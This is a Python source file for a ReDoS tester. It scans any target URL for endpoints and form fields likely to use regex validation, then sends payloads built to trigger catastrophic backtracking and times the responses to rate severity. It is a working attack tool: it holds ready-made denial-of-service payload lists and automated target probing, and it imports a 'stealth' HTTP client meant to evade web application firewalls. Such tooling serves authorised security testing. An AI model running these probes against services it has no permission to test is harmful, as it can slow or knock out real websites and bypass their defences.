#!/usr/bin/env python3
"""ReDoS (Regular Expression Denial of Service) Tester

Tests for ReDoS vulnerabilities:
- Exponential backtracking patterns in input fields
- Polynomial time complexity in regex processing
- Catastrophic backtracking detection
"""

import re
import time
from typing import Dict, Any, List, Optional
from urllib.parse import urlparse, urljoin, parse_qs, urlencode

import requests  # Always import for Session/exceptions support

# Import stealth HTTP client for WAF evasion
try:
    from tools.http_client import safe_get, safe_post, get_stealth_session
    USE_STEALTH = True
except ImportError:
    USE_STEALTH = False
    
    def safe_get(url, **kwargs):
        return requests.get(url, **kwargs)
    
    def safe_post(url, **kwargs):
        return requests.post(url, **kwargs)


# Endpoints commonly using regex validation
REDOS_PRONE_ENDPOINTS = [
    "/search", "/api/search", "/find",
    "/validate", "/api/validate", "/verify",
    "/filter", "/api/filter",
    "/parse", "/api/parse",
    "/regex", "/api/regex",
    "/email", "/api/email/validate",
    "/phone", "/api/phone/validate",
    "/url", "/api/url/validate",
    "/pattern", "/api/pattern",
]

# Common vulnerable regex patterns (for reference/detection)
VULNERABLE_PATTERNS = [
    # Nested quantifiers - exponential backtracking
    r"(a+)+",
    r"(a*)*",
    r"(a|a)+",
    r"(a|aa)+",
    # Email-like patterns
    r"([a-zA-Z0-9])+\.([a-zA-Z0-9])+",
    r"([a-zA-Z0-9]+)*@",
    # URL-like patterns
    r"(http|https)://([a-zA-Z0-9]+)+",
    # General nested quantifiers
    r"([a-z]+)+$",
    r"(\w+)+$",
]

# ReDoS payloads designed to trigger exponential backtracking
REDOS_PAYLOADS = {
    "email": [
        # For patterns like ^([a-zA-Z0-9])+\.([a-zA-Z0-9])+@
        "a" * 30 + "@",
        "a" * 40 + "!",
        "aaa" * 15 + "@@@",
        # For nested quantifier email patterns
        "a" * 25 + "@" + "b" * 25 + ".",
    ],
    "url": [
        # For URL validation patterns
        "http://" + "a" * 50 + "!",
        "https://" + "a" * 40 + "/" + "b" * 40 + "!",
        "http://" + "a/" * 30 + "x",
    ],
    "generic": [
        # Generic exponential backtracking
        "a" * 30 + "!",
        "a" * 40 + "X",
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
        # For patterns like (a+)+$
        "a" * 25 + "b",
        "a" * 30 + "\n",
        # For patterns like (\w+)+$
        "x" * 30 + "!",
        # Mixed character patterns
        "a1" * 20 + "!",
        "x" * 20 + " " + "y" * 20 + "!",
    ],
    "html": [
        # For HTML tag patterns
        "<" + "a" * 40 + ">",
        "</" + "a" * 40,
        "<!--" + "a" * 40,
    ],
    "path": [
        # For path/directory patterns
        "/" + "a" * 40 + "/" + "b" * 40 + "//",
        "../" * 30 + "x",
    ],
    "json": [
        # For JSON-like patterns
        '{"' + "a" * 40 + '":',
        '["' + "a" * 40 + '",',
    ],
}


def generate_redos_payload(size: int = 30, char: str = "a", suffix: str = "!") -> str:
    """Generate a ReDoS payload string.
    
    Args:
        size: Number of repeated characters
        char: Character to repeat
        suffix: Suffix to add (triggers backtracking on failure)
    
    Returns:
        ReDoS payload string
    """
    return char * size + suffix


def measure_response_time(
    url: str,
    method: str = "GET",
    params: Optional[Dict] = None,
    data: Optional[Dict] = None,
    timeout: int = 30
) -> float:
    """Measure response time for a request.
    
    Args:
        url: URL to request
        method: HTTP method
        params: Query parameters
        data: POST data
        timeout: Request timeout
    
    Returns:
        Response time in seconds, or -1 if error
    """
    start = time.time()
    try:
        if method.upper() == "GET":
            resp = safe_get(url, params=params, timeout=timeout)
        else:
            resp = safe_post(url, data=data, timeout=timeout)
        return time.time() - start
    except requests.exceptions.Timeout:
        return timeout + 1  # Indicate timeout
    except Exception:
        return -1


def test_parameter_redos(
    url: str,
    param_name: str,
    payload_type: str = "generic",
    timeout: int = 30
) -> Dict[str, Any]:
    """Test a specific parameter for ReDoS vulnerability.
    
    Args:
        url: URL to test
        param_name: Parameter name to test
        payload_type: Type of payload to use
        timeout: Request timeout
    
    Returns:
        Dict with test results
    """
    result = {
        "test": "parameter_redos",
        "url": url,
        "param": param_name,
        "vulnerable": False,
        "evidence": None,
        "baseline_time": None,
        "attack_time": None,
        "slowdown_factor": None,
    }
    
    # Get baseline response time with normal input
    baseline_params = {param_name: "normal_input_value"}
    baseline_time = measure_response_time(url, params=baseline_params, timeout=timeout)
    
    if baseline_time < 0:
        result["error"] = "Failed to get baseline response"
        return result
    
    result["baseline_time"] = baseline_time
    
    # Get payloads for this type
    payloads = REDOS_PAYLOADS.get(payload_type, REDOS_PAYLOADS["generic"])
    
    # Test each payload
    max_slowdown = 0
    worst_payload = None
    
    for payload in payloads:
        attack_params = {param_name: payload}
        attack_time = measure_response_time(url, params=attack_params, timeout=timeout)
        
        if attack_time < 0:
            continue
        
        # Check if response was significantly slower
        if baseline_time > 0:
            slowdown = attack_time / baseline_time
        else:
            slowdown = attack_time  # If baseline was instant
        
        if slowdown > max_slowdown:
            max_slowdown = slowdown
            worst_payload = payload
            result["attack_time"] = attack_time
        
        # If we hit timeout, definitely vulnerable
        if attack_time > timeout:
            result["vulnerable"] = True
            result["evidence"] = f"Request timed out ({timeout}s) with payload length {len(payload)}"
            result["slowdown_factor"] = "timeout"
            result["payload"] = payload[:50] + "..." if len(payload) > 50 else payload
            return result
    
    # Check if significant slowdown detected
    result["slowdown_factor"] = max_slowdown
    
    # Consider vulnerable if > 5x slowdown or > 5 seconds response
    if max_slowdown > 5 or (result.get("attack_time", 0) > 5):
        result["vulnerable"] = True
        result["evidence"] = f"Response {max_slowdown:.1f}x slower ({result.get('attack_time', 0):.2f}s vs {baseline_time:.2f}s)"
        result["payload"] = worst_payload[:50] + "..." if worst_payload and len(worst_payload) > 50 else worst_payload
    
    return result


def discover_input_parameters(url: str, timeout: int = 10) -> List[Dict[str, str]]:
    """Discover input parameters on a page.
    
    Args:
        url: URL to analyze
        timeout: Request timeout
    
    Returns:
        List of parameter info dicts
    """
    parameters = []
    
    try:
        resp = safe_get(url, timeout=timeout)
        
        # Extract parameters from URL
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        for param in query_params:
            parameters.append({
                "name": param,
                "type": "query",
                "source": "url"
            })
        
        # Extract parameters from forms (basic HTML parsing)
        content = resp.text.lower()
        
        # Find input fields
        import re
        input_pattern = r'<input[^>]+name=["\']([^"\']+)["\']'
        inputs = re.findall(input_pattern, content, re.IGNORECASE)
        for inp in inputs:
            if inp not in [p["name"] for p in parameters]:
                # Guess type based on name
                param_type = "generic"
                if "email" in inp.lower():
                    param_type = "email"
                elif "url" in inp.lower() or "link" in inp.lower():
                    param_type = "url"
                elif "path" in inp.lower() or "file" in inp.lower():
                    param_type = "path"
                
                parameters.append({
                    "name": inp,
                    "type": param_type,
                    "source": "form"
                })
        
        # Find textarea fields
        textarea_pattern = r'<textarea[^>]+name=["\']([^"\']+)["\']'
        textareas = re.findall(textarea_pattern, content, re.IGNORECASE)
        for ta in textareas:
            if ta not in [p["name"] for p in parameters]:
                parameters.append({
                    "name": ta,
                    "type": "generic",
                    "source": "textarea"
                })
        
    except Exception as e:
        pass
    
    # Add common parameter names if none found
    if not parameters:
        parameters = [
            {"name": "q", "type": "generic", "source": "common"},
            {"name": "search", "type": "generic", "source": "common"},
            {"name": "query", "type": "generic", "source": "common"},
            {"name": "input", "type": "generic", "source": "common"},
            {"name": "value", "type": "generic", "source": "common"},
            {"name": "data", "type": "generic", "source": "common"},
            {"name": "email", "type": "email", "source": "common"},
            {"name": "url", "type": "url", "source": "common"},
        ]
    
    return parameters


def discover_redos_endpoints(base_url: str, timeout: int = 10) -> List[str]:
    """Discover endpoints likely to use regex validation.
    
    Args:
        base_url: Base URL to scan
        timeout: Request timeout
    
    Returns:
        List of discovered URLs
    """
    discovered = []
    
    for endpoint in REDOS_PRONE_ENDPOINTS:
        test_url = urljoin(base_url, endpoint)
        try:
            resp = safe_get(test_url, timeout=timeout)
            if resp.status_code != 404:
                discovered.append(test_url)
        except:
            continue
    
    return discovered


def validate_redos(
    target_url: str,
    endpoints: Optional[List[str]] = None,
    discovery_data: Optional[Dict] = None,
    timeout: int = 30
) -> Dict[str, Any]:
    """Run comprehensive ReDoS vulnerability testing.
    
    Args:
        target_url: Base URL to test
        endpoints: Optional list of specific endpoints to test
        discovery_data: Optional discovery data with endpoints
        timeout: Request timeout
    
    Returns:
        Dict with all test results
    """
    result = {
        "target": target_url,
        "vulnerable": False,
        "vulnerable_params": [],
        "tests": [],
        "findings": [],
    }
    
    # Get endpoints to test
    if endpoints:
        test_endpoints = endpoints
    elif discovery_data and discovery_data.get("endpoints"):
        test_endpoints = [urljoin(target_url, ep) for ep in discovery_data["endpoints"]]
    else:
        test_endpoints = discover_redos_endpoints(target_url, timeout)
    
    if not test_endpoints:
        test_endpoints = [target_url]
    
    # Test each endpoint
    for endpoint in test_endpoints[:5]:  # Limit to 5 endpoints (ReDoS testing is slow)
        # Discover parameters
        params = discover_input_parameters(endpoint, timeout)
        
        for param_info in params[:5]:  # Limit to 5 params per endpoint
            param_name = param_info["name"]
            param_type = param_info.get("type", "generic")
            
            redos_test = test_parameter_redos(
                endpoint,
                param_name,
                payload_type=param_type,
                timeout=timeout
            )
            result["tests"].append(redos_test)
            
            if redos_test.get("vulnerable"):
                result["vulnerable"] = True
                result["vulnerable_params"].append({
                    "url": endpoint,
                    "param": param_name,
                    "slowdown": redos_test.get("slowdown_factor"),
                })
                
                # Determine severity based on slowdown
                slowdown = redos_test.get("slowdown_factor", 0)
                if slowdown == "timeout" or (isinstance(slowdown, (int, float)) and slowdown > 100):
                    severity = "high"
                elif isinstance(slowdown, (int, float)) and slowdown > 20:
                    severity = "medium"
                else:
                    severity = "low"
                
                result["findings"].append({
                    "type": "redos",
                    "url": endpoint,
                    "param": param_name,
                    "evidence": redos_test.get("evidence", ""),
                    "severity": severity,
                    "baseline_time": redos_test.get("baseline_time"),
                    "attack_time": redos_test.get("attack_time"),
                    "slowdown_factor": slowdown,
                    "payload": redos_test.get("payload"),
                })
    
    return result


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python redos_tester.py <target_url>")
        sys.exit(1)
    
    target = sys.argv[1]
    print(f"[*] Testing ReDoS on: {target}")
    print("[!] Warning: ReDoS testing can be slow due to intentional delays")
    
    results = validate_redos(target)
    
    print(f"\n[*] Results:")
    print(f"  Vulnerable: {results['vulnerable']}")
    print(f"  Vulnerable Parameters: {len(results['vulnerable_params'])}")
    
    for finding in results.get("findings", []):
        print(f"\n  Finding: {finding['type']} ({finding['severity']})")
        print(f"    URL: {finding['url']}")
        print(f"    Parameter: {finding['param']}")
        print(f"    Evidence: {finding.get('evidence', 'N/A')}")
        print(f"    Slowdown: {finding.get('slowdown_factor', 'N/A')}")

